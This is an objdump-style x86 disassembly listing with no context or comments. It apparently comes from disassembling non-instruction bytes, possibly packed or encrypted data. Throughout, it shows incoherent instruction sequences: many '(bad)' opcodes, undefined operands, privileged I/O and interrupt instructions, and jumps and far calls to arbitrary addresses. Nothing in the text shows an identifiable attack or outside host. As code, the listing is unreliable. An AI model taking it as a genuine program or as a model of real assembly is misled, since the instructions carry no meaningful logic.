  4078c8:	sub    al,0x2
  4078ca:	cmc    
  4078cb:	call   0xfccf3b38
  4078d0:	mov    eax,ds:0xc86a9022
  4078d5:	mov    ecx,0x5d083695
  4078da:	pop    ecx
  4078db:	push   es
  4078dc:	mov    esp,DWORD PTR [esi+0x371529ff]
  4078e2:	lods   al,BYTE PTR ds:[esi]
  4078e3:	jo     0x4078b6
  4078e5:	loop   0x407895
  4078e7:	mov    ebp,0x6628709e
  4078ec:	jecxz  0x407957
  4078ee:	movaps xmm1,XMMWORD PTR [edi]
  4078f1:	mov    bh,0xa1
  4078f3:	adc    al,0xc3
  4078f5:	jnp    0x407939
  4078f7:	repz hlt 
  4078f9:	pop    esp
  4078fa:	sub    eax,0x69669f19
  4078ff:	cmp    DWORD PTR [edi+0x41],ebx
  407902:	cmp    ch,BYTE PTR [edi]
  407904:	nop
  407905:	adc    al,0xfd
  407907:	pusha  
  407908:	mov    cl,0x4c
  40790a:	push   edi
  40790b:	push   cs
  40790c:	add    ah,ch
  40790e:	pop    edi
  40790f:	ret    
  407910:	in     al,dx
  407911:	leave  
  407912:	cwde   
  407913:	hlt    
  407914:	jecxz  0x407987
  407916:	into   
  407917:	dec    edi
  407918:	into   
  407919:	pop    ss
  40791a:	jo     0x407917
  40791c:	aaa    
  40791d:	inc    eax
  40791e:	mov    bl,0x9d
  407920:	aam    0x8b
  407922:	mov    bl,0xbd
  407924:	dec    eax
  407925:	add    edi,ebx
  407927:	mov    ds:0x3ea34645,eax
  40792c:	dec    esi
  40792d:	daa    
  40792e:	jge    0x407976
  407930:	push   edi
  407931:	mov    edx,0x23b353d9
  407936:	inc    edx
  407937:	xor    ecx,DWORD PTR [eax+0x45]
  40793a:	cwde   
  40793b:	(bad)
  40793e:	aas    
  40793f:	enter  0xeaa0,0xcd
  407943:	scas   al,BYTE PTR es:[edi]
  407944:	hlt    
  407945:	ret    0x17e6
  407948:	push   ebx
  407949:	mov    ebx,0xf12d3586
  40794e:	push   ss
  40794f:	push   ss
  407950:	ja     0x407941
  407952:	jbe    0x40796c
  407954:	mov    eax,ds:0xad6a0867
  407959:	jecxz  0x4078e1
  40795b:	xchg   dl,bh
  40795d:	or     BYTE PTR [edi],al
  40795f:	stos   BYTE PTR es:[edi],al
  407960:	xchg   BYTE PTR [esi],al
  407962:	shr    BYTE PTR [edi-0x3b],cl
  407965:	cmp    eax,DWORD PTR [esp+edx*4]
  407968:	ins    BYTE PTR es:[edi],dx
  407969:	add    esi,0x3e
  40796c:	or     edi,esp
  40796e:	rcr    DWORD PTR [ebx],0x5f
  407971:	iret   
  407972:	sub    eax,0x6ccae011
  407977:	je     0x40795f
  407979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797a:	inc    esi
  40797b:	cmp    ebp,0xc1b2a1d1
  407981:	mov    cs,WORD PTR [edx+0x1d]
  407984:	out    dx,al
  407985:	mov    ebx,0x78aff903
  40798a:	or     eax,0x9a0859c1
  40798f:	test   BYTE PTR [eax-0x605d6b91],dh
  407995:	fsub   QWORD PTR [esp+esi*4-0x4e7ce44e]
  40799c:	or     al,0xb0
  40799e:	jecxz  0x4079d1
  4079a0:	xor    BYTE PTR [ebx-0x5d],bh
  4079a3:	ror    DWORD PTR [ecx-0x3e],0xf1
  4079a7:	fsub   st,st(5)
  4079a9:	xor    ebp,DWORD PTR [ebx+0x7a]
  4079ac:	shl    BYTE PTR [ebx],0x49
  4079af:	fadd   DWORD PTR [esp+eiz*4+0x8]
  4079b3:	nop
  4079b4:	xchg   ebp,eax
  4079b5:	imul   ecx,DWORD PTR ds:0xe98edf78,0xffffff91
  4079bc:	gs jecxz 0x4079e5
  4079bf:	(bad)  
  4079c0:	in     eax,0xb7
  4079c2:	fld    QWORD PTR ds:[edx+0x359a2b2a]
  4079c9:	shr    DWORD PTR [esi+0x2c],1
  4079cc:	out    0x48,al
  4079ce:	mov    esp,0xe1e3cc99
  4079d3:	or     cl,bl
  4079d5:	mov    ds:0x16bf6ba,al
  4079da:	push   esp
  4079db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079dc:	push   ecx
  4079dd:	mov    bh,0xf2
  4079df:	or     esp,edx
  4079e1:	jg     0x407a10
  4079e3:	jg     0x407a31
  4079e5:	push   eax
  4079e6:	push   esi
  4079e7:	in     al,dx
  4079e8:	mov    eax,0xb775a544
  4079ed:	sub    DWORD PTR [ecx+0x65],eax
  4079f0:	sbb    BYTE PTR [ebp+0x45],bl
  4079f3:	pusha  
  4079f4:	push   esp
  4079f5:	sub    eax,0xe88c8109
  4079fa:	cmp    esp,ebx
  4079fc:	cld    
  4079fd:	cli    
  4079fe:	sbb    edx,DWORD PTR [eax+0x43]
  407a01:	or     eax,0x5099742b
  407a06:	xor    edx,DWORD PTR [ecx]
  407a08:	mov    ch,0x1c
  407a0a:	jns    0x407a83
  407a0c:	mov    ah,0x6c
  407a0e:	sub    ch,ch
  407a10:	push   ds
  407a11:	mov    ecx,0xd63163c9
  407a16:	xchg   BYTE PTR [esi+0x70],bh
  407a19:	int    0x12
  407a1b:	sub    al,0x30
  407a1d:	xchg   ebp,eax
  407a1e:	dec    edx
  407a1f:	loope  0x407a2f
  407a21:	out    dx,eax
  407a22:	(bad)  
  407a23:	loopne 0x407a85
  407a25:	jno    0x407a45
  407a27:	fild   QWORD PTR [ebx+0x66]
  407a2a:	ror    DWORD PTR [edx*8-0x7bb0a1d1],cl
  407a31:	mov    eax,0x389d0874
  407a36:	mov    edx,0x82578d0
  407a3b:	out    0xa9,al
  407a3d:	fsubrp st(0),st
  407a3f:	dec    ebx
  407a40:	xchg   ebx,eax
  407a41:	xchg   DWORD PTR [ecx+0x66],esi
  407a44:	lea    edi,[ebx-0x15d0934e]
  407a4a:	mov    edi,0x549e1f15
  407a4f:	xchg   ebx,eax
  407a50:	adc    esp,esi
  407a52:	cmc    
  407a53:	cmp    edx,ebp
  407a55:	sar    DWORD PTR [ebx-0x1961ec0d],cl
  407a5b:	pop    ss
  407a5c:	jmp    0xeb26:0x53e3c532
  407a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a64:	jecxz  0x407aa7
  407a66:	sub    al,BYTE PTR [ecx+0x1c40f2ab]
  407a6c:	test   DWORD PTR [esi],eax
  407a6e:	sar    BYTE PTR [eax-0x25d84fec],1
  407a74:	ss loop 0x407af3
  407a77:	mov    ch,0xe2
  407a79:	xor    esp,DWORD PTR [esi]
  407a7b:	es dec esi
  407a7d:	jge    0x407ae2
  407a7f:	loop   0x407aff
  407a81:	cdq    
  407a82:	(bad)  
  407a83:	xlat   BYTE PTR ds:[ebx]
  407a84:	mov    ebp,0x594f5e5b
  407a89:	jecxz  0x407ac9
  407a8b:	daa    
  407a8c:	cmp    al,0x44
  407a8e:	pop    esi
  407a8f:	inc    edi
  407a90:	or     DWORD PTR [eax+0x53],edi
  407a93:	xor    eax,0xad1b7d46
  407a98:	sahf   
  407a99:	(bad)  
  407a9a:	cmp    al,0x76
  407a9c:	in     eax,dx
  407a9d:	push   esi
  407a9e:	aad    0x2a
  407aa0:	ins    DWORD PTR es:[edi],dx
  407aa1:	aad    0xa1
  407aa3:	sbb    al,0x2f
  407aa5:	lods   al,BYTE PTR ds:[esi]
  407aa6:	(bad)  
  407aa7:	xor    ch,dl
  407aa9:	sub    ah,BYTE PTR [ebx+0x48]
  407aac:	loope  0x407ae5
  407aae:	call   0x7a49b0ea
  407ab3:	(bad)  
  407ab4:	and    BYTE PTR [ebp-0x2f6b98aa],dh
  407aba:	dec    ebx
  407abb:	pop    ds
  407abc:	loopne 0x407a4c
  407abe:	mov    ebx,0x23f244ca
  407ac3:	neg    DWORD PTR [esi+ebx*1-0x73960c22]
  407aca:	in     eax,dx
  407acb:	out    dx,al
  407acc:	xor    BYTE PTR [eax+ecx*1],bl
  407acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad0:	call   0x11c2:0x79f485e7
  407ad7:	and    al,BYTE PTR [ebx-0x36]
  407ada:	js     0x407a87
  407adc:	adc    ebp,ecx
  407ade:	ss stc 
  407ae0:	mov    eax,0xfd49828e
  407ae5:	inc    ebx
  407ae6:	sbb    DWORD PTR [eax-0x6c],ecx
  407ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aea:	clc    
  407aeb:	cwde   
  407aec:	or     al,0xa2
  407aef:	mov    esi,0xca958780
  407af4:	pusha  
  407af5:	cmc    
  407af6:	jbe    0x407b32
  407af8:	pop    edi
  407af9:	adc    DWORD PTR [eax-0x20],eax
  407afc:	popa   
  407afd:	icebp  
  407afe:	lahf   
  407aff:	dec    ecx
  407b00:	sub    eax,0xcd9ca71e
  407b05:	xlat   BYTE PTR ds:[ebx]
  407b06:	xlat   BYTE PTR ds:[ebx]
  407b07:	cmp    al,dh
  407b09:	aam    0x83
  407b0b:	cmp    DWORD PTR [edx-0x661c9a41],0xffffffb1
  407b12:	dec    ebp
  407b13:	and    edx,DWORD PTR [ebx+0x27]
  407b16:	loopne 0x407ad5
  407b18:	xchg   ecx,eax
  407b19:	xor    al,0xd8
  407b1b:	and    al,BYTE PTR [edx-0x73]
  407b1e:	jmp    0x9423e671
  407b23:	std    
  407b24:	inc    eax
  407b25:	cmp    cl,BYTE PTR [ecx]
  407b27:	div    BYTE PTR [ebp-0x2430b0e0]
  407b2d:	imul   ebx,DWORD PTR ds:0x8f40bdd,0x93c0599b
  407b37:	call   0xe845:0xae2906e6
  407b3e:	inc    ebp
  407b3f:	dec    ebx
  407b40:	lods   al,BYTE PTR ds:[esi]
  407b41:	stos   DWORD PTR es:[edi],eax
  407b42:	lods   al,BYTE PTR ds:[esi]
  407b43:	test   al,0xb9
  407b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b46:	jmp    0xba1d621f
  407b4b:	xchg   ebx,eax
  407b4c:	fwait
  407b4d:	pop    edx
  407b4e:	scas   al,BYTE PTR es:[edi]
  407b4f:	xchg   BYTE PTR [esi],cl
  407b51:	mov    al,0xce
  407b53:	call   0x356c:0xe098ae3f
  407b5a:	cs inc esp
  407b5c:	out    dx,al
  407b5d:	sub    DWORD PTR [ebx+0x721ee472],esp
  407b63:	mov    eax,0xdac77d59
  407b68:	gs jb  0x407aef
  407b6b:	or     DWORD PTR [edi+0x1b],0x4b
  407b6f:	cmp    ebx,esi
  407b71:	fist   DWORD PTR [ebx+0x3e452a07]
  407b77:	lahf   
  407b78:	xor    eax,0x50fef60c
  407b7d:	mov    edi,0x94384615
  407b82:	mov    ds:0x4204a55e,eax
  407b87:	aad    0x55
  407b89:	inc    ebp
  407b8a:	loope  0x407b87
  407b8c:	repnz (bad) 
  407b8e:	or     edx,DWORD PTR [edx-0x1b]
  407b91:	mov    ecx,0x8ce22032
  407b96:	sub    al,0x43
  407b98:	xchg   BYTE PTR [edi],ch
  407b9a:	js     0x407ba8
  407b9c:	pop    ds
  407b9d:	leave  
  407b9e:	sti    
  407b9f:	repz push ss
  407ba1:	hlt    
  407ba2:	push   ebx
  407ba3:	or     al,0x6c
  407ba5:	out    0x9,eax
  407ba7:	mov    edx,0x3fa5ef6c
  407bac:	mov    ds:0xfd8cc7c9,al
  407bb1:	daa    
  407bb2:	sub    al,0x7c
  407bb4:	hlt    
  407bb5:	sbb    BYTE PTR [ecx],dh
  407bb7:	imul   DWORD PTR [edx]
  407bb9:	sbb    DWORD PTR [edi-0x575354e1],ecx
  407bbf:	jmp    0xfcb5:0xb9d55c0e
  407bc6:	nop
  407bc7:	mov    gs,WORD PTR [ebp+0x752a045f]
  407bcd:	in     eax,dx
  407bce:	xor    DWORD PTR [eax+0x3d2040a3],ebp
  407bd4:	sub    cl,BYTE PTR [ebp+esi*2-0x4b6c62ac]
  407bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bdc:	xor    al,0x85
  407bde:	hlt    
  407bdf:	imul   ecx,DWORD PTR [ebx-0x4c0639c9],0x16
  407be6:	and    DWORD PTR [ecx-0x3400e8fe],ecx
  407bec:	push   0x3a
  407bee:	and    ebp,edi
  407bf0:	xor    al,BYTE PTR [edx-0x13c9c63c]
  407bf6:	sbb    bl,BYTE PTR [ecx+0x101e7aaf]
  407bfc:	inc    ebp
  407bfd:	push   cs
  407bfe:	mov    eax,ebp
  407c00:	enter  0x80e5,0x52
  407c04:	test   al,0xb3
  407c06:	jmp    0xcd81e4e8
  407c0b:	inc    esi
  407c0c:	cmc    
  407c0d:	mov    DWORD PTR [ebx+0x33],eax
  407c10:	stc    
  407c11:	stos   BYTE PTR es:[edi],al
  407c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c13:	mov    esp,0x99e54cd7
  407c18:	mov    ebx,0x7f3a9c1b
  407c1d:	and    cl,bh
  407c1f:	pop    ebp
  407c20:	cmp    DWORD PTR [ebx-0x7a81229d],ecx
  407c26:	nop
  407c27:	jg     0x407bd8
  407c29:	mov    dl,BYTE PTR [esi-0x6a40b16c]
  407c2f:	into   
  407c30:	jl     0x407c1a
  407c32:	into   
  407c33:	mov    ?,WORD PTR [edi-0x29]
  407c36:	scas   al,BYTE PTR es:[edi]
  407c37:	push   ss
  407c38:	add    al,0x9d
  407c3a:	xchg   DWORD PTR [edi+0x5617610a],edx
  407c40:	adc    al,0x89
  407c42:	fwait
  407c43:	int    0x29
  407c45:	or     eax,DWORD PTR [edi-0x34]
  407c48:	dec    esi
  407c49:	test   edx,edx
  407c4b:	dec    ebx
  407c4c:	inc    edx
  407c4d:	in     eax,dx
  407c4e:	std    
  407c4f:	aas    
  407c50:	mov    bl,0x16
  407c52:	push   ss
  407c53:	fcomp  DWORD PTR ds:0x68b8a786
  407c59:	mov    dh,0x71
  407c5b:	mov    DWORD PTR [esi+0x2a6e24b6],esi
  407c61:	mov    DWORD PTR [eax-0x8],esp
  407c64:	jl     0x407c91
  407c66:	test   al,0xe4
  407c68:	(bad)  
  407c69:	xor    DWORD PTR [edi-0x77eaefe4],ebp
  407c6f:	push   ss
  407c70:	bound  ebx,QWORD PTR [edx+0x2]
  407c73:	xor    BYTE PTR [ebx],dh
  407c75:	mov    al,0x0
  407c77:	adc    BYTE PTR [esi+0x24ee7165],bl
  407c7d:	xchg   ebx,eax
  407c7e:	adc    DWORD PTR [eax+esi*1-0x2c],ecx
  407c82:	xchg   edi,eax
  407c83:	cwde   
  407c84:	add    eax,0x8283ce45
  407c89:	icebp  
  407c8a:	mov    ebx,0xc4419014
  407c8f:	cmp    edx,DWORD PTR [edx-0x6e]
  407c92:	add    ecx,eax
  407c94:	or     BYTE PTR ds:0x550ef32d,al
  407c9a:	fimul  WORD PTR [ebx+0x5]
  407c9d:	dec    eax
  407c9e:	mov    ebx,0x548a68c
  407ca3:	sbb    edi,DWORD PTR [eax+0x6c11dd50]
  407ca9:	jl     0x407c94
  407cab:	stos   BYTE PTR es:[edi],al
  407cac:	add    eax,0xad4e5642
  407cb1:	(bad)  
  407cb3:	outs   dx,BYTE PTR ds:[esi]
  407cb4:	cmp    ah,0x2b
  407cb7:	popa   
  407cb8:	fcom   QWORD PTR [ebx+0x17]
  407cbb:	xor    DWORD PTR [ecx-0x240086bd],edi
  407cc1:	mov    eax,0xe57d598d
  407cc6:	sbb    DWORD PTR [eax+0x36],esp
  407cc9:	aam    0x39
  407ccb:	mov    edi,0xe4d75ba3
  407cd0:	cmp    BYTE PTR [eax+edi*2],ah
  407cd3:	stos   DWORD PTR es:[edi],eax
  407cd4:	call   0x1e76:0xdd641f28
  407cdb:	pop    ecx
  407cdc:	je     0x407d2d
  407cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cdf:	jnp    0x407cc4
  407ce1:	sbb    DWORD PTR [esi],edi
  407ce3:	scas   eax,DWORD PTR es:[edi]
  407ce4:	sbb    eax,0xafd7a87a
  407ce9:	inc    esi
  407cea:	fistp  DWORD PTR [esi-0x4a99ec3a]
  407cf0:	jne    0x407c8e
  407cf2:	fwait
  407cf3:	pop    eax
  407cf4:	push   esp
  407cf5:	jp     0x407d3f
  407cf7:	leave  
  407cf8:	fistp  DWORD PTR [ebp-0x7f]
  407cfb:	fistp  QWORD PTR [ebx+0x6643a2b1]
  407d01:	sub    DWORD PTR [edi-0x6c],esp
  407d04:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407d06:	pop    ebx
  407d07:	cld    
  407d08:	and    eax,0xfc36ac31
  407d0d:	les    edi,FWORD PTR [esp+ecx*4+0x3f089a0a]
  407d14:	test   eax,0x824a8ad7
  407d19:	push   cs
  407d1a:	je     0x407cbc
  407d1c:	out    0x36,al
  407d1e:	adc    DWORD PTR [ebp+0x2a],eax
  407d21:	mov    al,ds:0xe0b07e8
  407d26:	cmp    ch,BYTE PTR [eax]
  407d28:	xor    ecx,esp
  407d2a:	out    0x9c,al
  407d2c:	pop    es
  407d2d:	fsubr  QWORD PTR [ebp+0x5f]
  407d30:	popf   
  407d31:	push   0xe6e290a4
  407d36:	pop    esi
  407d37:	jne    0x407d96
  407d39:	js     0x407d42
  407d3b:	xchg   esp,eax
  407d3c:	pop    ebp
  407d3d:	sbb    BYTE PTR [esp+eax*1+0x2d],cl
  407d41:	add    al,0x28
  407d43:	lds    ebx,FWORD PTR [edx+0x58febd24]
  407d49:	ds jns 0x407d68
  407d4c:	js     0x407dcc
  407d4e:	repnz (bad) 
  407d50:	push   ebp
  407d51:	pop    eax
  407d52:	ja     0x407ced
  407d54:	cdq    
  407d55:	and    BYTE PTR [edi+0x28],bh
  407d58:	out    dx,al
  407d59:	aam    0x70
  407d5b:	mov    dh,0x9e
  407d5d:	cld    
  407d5e:	ins    DWORD PTR es:[edi],dx
  407d5f:	ret    
  407d60:	ret    
  407d61:	and    DWORD PTR ds:0xa06ea43a,esi
  407d67:	add    ch,0x65
  407d6a:	mov    ecx,0x90702c86
  407d6f:	mov    ch,0xd1
  407d71:	pop    edi
  407d72:	sbb    al,BYTE PTR [eax]
  407d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d75:	xchg   ebx,eax
  407d76:	sub    BYTE PTR [esi-0x75],dl
  407d79:	push   0xffffff8b
  407d7b:	loop   0x407db6
  407d7d:	cmp    eax,eax
  407d7f:	add    DWORD PTR ds:0x40aab480,esp
  407d85:	retf   
  407d86:	out    dx,al
  407d87:	aam    0x2d
  407d89:	dec    ebx
  407d8a:	dec    ecx
  407d8b:	sbb    ebx,esp
  407d8d:	fstp   TBYTE PTR [eax+0x730995a0]
  407d93:	xchg   ebx,eax
  407d94:	pop    eax
  407d95:	xchg   esi,eax
  407d96:	(bad)  
  407d97:	scas   eax,DWORD PTR es:[edi]
  407d98:	dec    ecx
  407d99:	xor    edx,DWORD PTR [edx-0x28a2c516]
  407d9f:	push   ebp
  407da0:	std    
  407da1:	sub    eax,0x1e019678
  407da6:	je     0x407e18
  407da8:	(bad)  
  407da9:	adc    eax,0xffeb2545
  407dae:	cmp    BYTE PTR [edx-0x59],0x6f
  407db2:	adc    ch,0xb8
  407db5:	lock imul edi,DWORD PTR [ebp+0x1f],0xb06b5cbd
  407dbd:	fcomp  DWORD PTR [eax]
  407dbf:	es nop
  407dc1:	sbb    cl,BYTE PTR [ebx]
  407dc3:	or     BYTE PTR [esi-0x43],0x5c
  407dc7:	jecxz  0x407e29
  407dc9:	pop    ebp
  407dca:	outs   dx,DWORD PTR ds:[esi]
  407dcb:	jp     0x407d68
  407dcd:	test   DWORD PTR [esi],edx
  407dcf:	or     al,0xdd
  407dd1:	mov    al,0xca
  407dd3:	fild   DWORD PTR [ebx-0x6f]
  407dd6:	ror    DWORD PTR [ebx-0x464a648c],0xa2
  407ddd:	cmp    BYTE PTR [edx-0x744589c5],al
  407de3:	mov    es,ebx
  407de5:	or     eax,0xe9394379
  407dea:	lock sbb esi,ecx
  407ded:	mov    ch,0x58
  407def:	int    0xa4
  407df1:	mov    edx,0x7817bd66
  407df6:	adc    edx,DWORD PTR [eax+0x52]
  407df9:	jb     0x407e3a
  407dfb:	outs   dx,DWORD PTR ds:[esi]
  407dfc:	mov    WORD PTR ds:0x3150ea16,?
  407e02:	scas   al,BYTE PTR es:[edi]
  407e03:	push   0x31
  407e05:	sti    
  407e06:	pop    ss
  407e07:	call   0x573b:0x6f459905
  407e0e:	add    edi,DWORD PTR [esi]
  407e10:	or     eax,0xe1e92c48
  407e15:	mov    ds:0xe2bbe94b,al
  407e1a:	jnp    0x407e51
  407e1c:	scas   eax,DWORD PTR es:[edi]
  407e1d:	repz push esi
  407e1f:	adc    eax,0xd23efda1
  407e24:	inc    esi
  407e25:	cwde   
  407e26:	jmp    edx
  407e28:	and    BYTE PTR [esi+0x5a],ch
  407e2b:	sub    dl,BYTE PTR [ecx]
  407e2d:	sub    edx,esi
  407e2f:	push   edi
  407e30:	scas   eax,DWORD PTR es:[edi]
  407e31:	adc    ah,dl
  407e33:	pop    edi
  407e34:	push   eax
  407e35:	sub    eax,0x2abc3d83
  407e3a:	add    DWORD PTR [edi+ecx*4],ebx
  407e3d:	clc    
  407e3e:	in     al,0xb4
  407e40:	dec    esi
  407e41:	mov    edx,0x5c07f74a
  407e46:	dec    ebx
  407e47:	shr    DWORD PTR [ebx],1
  407e49:	push   esi
  407e4a:	scas   eax,DWORD PTR es:[edi]
  407e4b:	mov    ebx,0x2139ce1d
  407e50:	push   es
  407e51:	lds    edx,FWORD PTR [ebx-0x34]
  407e54:	sub    al,0x2c
  407e56:	test   al,0x75
  407e58:	mov    ch,BYTE PTR [esi+0x5b]
  407e5b:	mov    ds:0xa1f023d6,eax
  407e60:	push   es
  407e61:	fldcw  WORD PTR [ebx-0x2ead20bf]
  407e67:	push   edx
  407e68:	adc    ebx,ebp
  407e6a:	jmp    0xc2ce3f3a
  407e6f:	pop    edi
  407e70:	jno    0x407e8f
  407e72:	or     eax,0x99f43ece
  407e77:	pop    ecx
  407e78:	iret   
  407e79:	cmc    
  407e7a:	dec    ecx
  407e7b:	stos   BYTE PTR es:[edi],al
  407e7c:	or     dh,BYTE PTR [eax]
  407e7e:	mov    ebx,0x603e37f4
  407e83:	sub    ch,bl
  407e85:	repnz dec eax
  407e87:	addr16 mov eax,0x7849390
  407e8d:	out    0x6f,al
  407e8f:	fwait
  407e90:	scas   al,BYTE PTR es:[edi]
  407e91:	sub    BYTE PTR cs:0xbc8ee373,bl
  407e98:	jmp    0xcf7d:0xba3d9b0b
  407e9f:	ins    BYTE PTR es:[edi],dx
  407ea0:	fdivr  st,st(0)
  407ea2:	sar    esi,cl
  407ea4:	jne    0x407e6b
  407ea6:	cmp    edx,DWORD PTR [esi+0x20a2fbea]
  407eac:	sar    DWORD PTR [esi],1
  407eae:	mov    cl,0x7a
  407eb0:	jns    0x407f07
  407eb2:	adc    ecx,0x1d
  407eb5:	sbb    cx,WORD PTR [ebx-0x10]
  407eb9:	mov    ch,0x3
  407ebb:	and    bh,BYTE PTR [eax]
  407ebd:	mov    bh,0xfc
  407ebf:	lods   al,BYTE PTR ds:[esi]
  407ec0:	aad    0x14
  407ec2:	mov    ecx,0xed85ceba
  407ec7:	test   BYTE PTR [ebx],al
  407ec9:	cs (bad) 
  407ecb:	mov    ebp,0x117ca37
  407ed0:	fwait
  407ed1:	inc    DWORD PTR [eax+0x75]
  407ed4:	rol    ah,cl
  407ed6:	jae    0x407e9c
  407ed8:	mov    dh,0x10
  407eda:	int    0x5e
  407edc:	xor    BYTE PTR [edx-0x64b57d54],bh
  407ee2:	outs   dx,BYTE PTR ds:[esi]
  407ee3:	fist   WORD PTR [edx]
  407ee5:	fnstsw WORD PTR [edi]
  407ee7:	push   0x55
  407ee9:	pop    ebx
  407eea:	stc    
  407eeb:	sub    DWORD PTR [edx-0x16c75cd9],edx
  407ef1:	rcr    BYTE PTR fs:[edi+0x49],cl
  407ef5:	xchg   esi,eax
  407ef6:	outs   dx,DWORD PTR ds:[esi]
  407ef7:	push   esp
  407ef8:	clc    
  407ef9:	bound  ebx,QWORD PTR [ebx]
  407efb:	dec    ebp
  407efc:	add    bh,bh
  407efe:	dec    esp
  407eff:	mov    cs:0xce274d01,al
  407f05:	in     eax,dx
  407f06:	dec    ebp
  407f07:	cdq    
  407f08:	iret   
  407f09:	ret    0xbdb9
  407f0c:	ja     0x407f64
  407f0e:	add    al,0xa4
  407f10:	(bad)  
  407f12:	test   eax,0x13f6847c
  407f17:	sar    ebp,cl
  407f19:	jae    0x407f5f
  407f1b:	xchg   esp,eax
  407f1c:	mov    dh,0x45
  407f1e:	ficomp WORD PTR [ecx]
  407f20:	mov    ecx,0xc0fbb59c
  407f25:	(bad)  
  407f26:	xor    BYTE PTR [ebx+eiz*2-0x7c],ch
  407f2a:	xchg   ecx,eax
  407f2b:	cmc    
  407f2c:	push   es
  407f2d:	(bad)  
  407f2e:	std    
  407f2f:	xor    DWORD PTR [ebx],edi
  407f31:	fucomip st,st(6)
  407f33:	xchg   edx,eax
  407f34:	fwait
  407f35:	sar    BYTE PTR [ebp-0x73],0x9b
  407f39:	fadd   st(3),st
  407f3b:	or     BYTE PTR [ebp*4-0x37fc8e5],bl
  407f42:	repnz in eax,dx
  407f44:	call   0x17171f2f
  407f49:	jmp    0x407fab
  407f4b:	push   esp
  407f4c:	fwait
  407f4d:	xor    al,0xc
  407f4f:	es jl  0x407f24
  407f52:	mov    ebp,0x48a60174
  407f57:	or     BYTE PTR [ecx-0x7c],cl
  407f5a:	icebp  
  407f5b:	mov    al,ds:0xdbe0724
  407f60:	stos   BYTE PTR es:[edi],al
  407f61:	or     al,0x35
  407f63:	mov    ecx,0x13f4a8f8
  407f68:	retf   
  407f69:	sub    BYTE PTR [edx],dh
  407f6b:	cmp    BYTE PTR [esi-0x49],al
  407f6e:	stc    
  407f6f:	cmp    BYTE PTR [edi+ebp*4],ch
  407f72:	sar    BYTE PTR [ecx+0x60],0xa5
  407f76:	(bad)  
  407f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f79:	in     eax,dx
  407f7a:	mov    ecx,esp
  407f7c:	out    0x30,al
  407f7e:	ret    0x77e3
  407f81:	loopne 0x407f09
  407f83:	(bad)  
  407f84:	leave  
  407f85:	push   esi
  407f86:	addr16 inc esi
  407f88:	out    dx,eax
  407f89:	loope  0x40800a
  407f8b:	cmp    bh,BYTE PTR [esi-0x35]
  407f8e:	test   DWORD PTR [esi-0x73],0x48717d0a
  407f95:	es test eax,0x2436b3cd
  407f9b:	adc    al,0x5c
  407f9d:	push   ebx
  407f9e:	stc    
  407f9f:	cmp    al,0xdc
  407fa1:	mov    ch,0x25
  407fa3:	jge    0x408012
  407fa5:	sbb    eax,0xb0d94108
  407faa:	dec    edi
  407fab:	add    ah,bl
  407fad:	ficom  WORD PTR ds:0x57543e62
  407fb3:	push   esp
  407fb4:	fdiv   st,st(2)
  407fb6:	mov    eax,ds:0x2d187ff4
  407fbb:	or     BYTE PTR [ecx+0x5f3e0aca],bl
  407fc1:	adc    edi,DWORD PTR [ebx]
  407fc3:	pop    ecx
  407fc4:	push   esp
  407fc5:	mov    eax,edx
  407fc7:	cmp    bh,BYTE PTR [edi+ecx*8+0x55c1c263]
  407fce:	xchg   esi,eax
  407fcf:	mov    gs,WORD PTR [ebp-0x513c14cf]
  407fd5:	add    BYTE PTR [eax+0x7ba80e8d],0xf5
  407fdc:	add    BYTE PTR [eax+0x0],0xf8
  407fe0:	iret   
  407fe1:	sbb    al,0x88
  407fe3:	fwait
  407fe4:	inc    BYTE PTR [edx+0x6295dcef]
  407fea:	push   ecx
  407feb:	add    ecx,DWORD PTR [ebp+0x7f]
  407fee:	xchg   BYTE PTR [edx],al
  407ff0:	ror    DWORD PTR [ecx-0x59],cl
  407ff3:	mov    cl,ah
  407ff5:	or     BYTE PTR [edx+0x57],bh
  407ff8:	and    BYTE PTR [eax],bh
  407ffa:	sbb    esi,DWORD PTR [edx+0x37]
  407ffd:	mov    WORD PTR [edx-0x1e],?
  408000:	out    dx,al
  408001:	data16 (bad) 
  408003:	jmp    0xfa77dd0d
  408008:	pop    esp
  408009:	pop    ecx
  40800a:	into   
  40800b:	mov    ds:0x329b58aa,al
  408010:	push   esi
  408011:	jo     0x407fcb
  408013:	xor    BYTE PTR [ecx+0x5ba95185],ch
  408019:	pop    eax
  40801a:	data16 and BYTE PTR [esi+0x28],dl
  40801e:	and    cl,bl
  408020:	push   ds
  408021:	shl    BYTE PTR [ebp-0x4366cc33],1
  408027:	mov    ds:0x3b61bea7,eax
  40802c:	fistp  WORD PTR [edi-0x2c]
  40802f:	dec    ebp
  408030:	mov    cl,0x1d
  408032:	sub    eax,edx
  408034:	adc    dl,al
  408036:	loopne 0x4080ac
  408038:	fild   WORD PTR [ecx+0xa279424]
  40803e:	pop    ecx
  40803f:	in     eax,dx
  408040:	nop
  408041:	push   ds
  408042:	push   edi
  408043:	retf   
  408044:	pop    esp
  408045:	cli    
  408046:	dec    eax
  408047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408048:	jle    0x408050
  40804a:	imul   esp,edi,0x2a7b3fb4
  408050:	jnp    0x40807a
  408052:	in     al,dx
  408053:	ficomp DWORD PTR [edx-0x24]
  408056:	fisub  WORD PTR [ebx]
  408058:	xchg   edi,eax
  408059:	icebp  
  40805a:	mov    al,ds:0xff4a2f41
  40805f:	jns    0x4080a9
  408061:	mov    eax,DWORD PTR [ecx]
  408063:	dec    edx
  408064:	and    al,0xfa
  408066:	pop    edi
  408067:	mov    eax,DWORD PTR [esi-0x4ebccddf]
  40806d:	push   esp
  40806e:	cmp    al,BYTE PTR [ecx+ecx*8-0x5e]
  408072:	jne    0x4080ab
  408074:	and    DWORD PTR [edi],eax
  408076:	jne    0x40808a
  408078:	push   es
